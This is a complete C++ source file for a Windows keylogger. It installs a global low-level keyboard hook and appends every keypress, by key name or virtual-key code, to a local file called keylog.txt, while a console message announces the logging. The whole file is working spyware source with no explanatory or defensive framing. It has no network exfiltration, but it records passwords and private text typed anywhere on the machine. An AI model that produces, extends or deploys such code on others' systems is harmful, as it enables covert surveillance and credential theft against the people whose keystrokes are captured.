#include <windows.h>
#include <fstream>
#include <iostream>

HHOOK hKeyHook;
std::ofstream logFile("keylog.txt", std::ios::app);

LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = keyInfo->vkCode;

        // Convert virtual key to readable string (optional formatting)
        char keyName[128];
        if (GetKeyNameTextA((LONG)(keyInfo->scanCode << 16), keyName, sizeof(keyName)) > 0) {
            logFile << "[" << keyName << "] ";
        } else {
            logFile << "[VK " << vkCode << "] ";
        }

        logFile.flush(); // ensure data is written immediately
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

int main() {
    MSG msg;

    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, NULL, 0);
    if (!hKeyHook) {
        std::cerr << "Hook failed." << std::endl;
        return 1;
    }

    std::cout << "[*] Logging keys to keylog.txt. Press Ctrl+C to stop." << std::endl;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyHook);
    logFile.close();
    return 0;
}
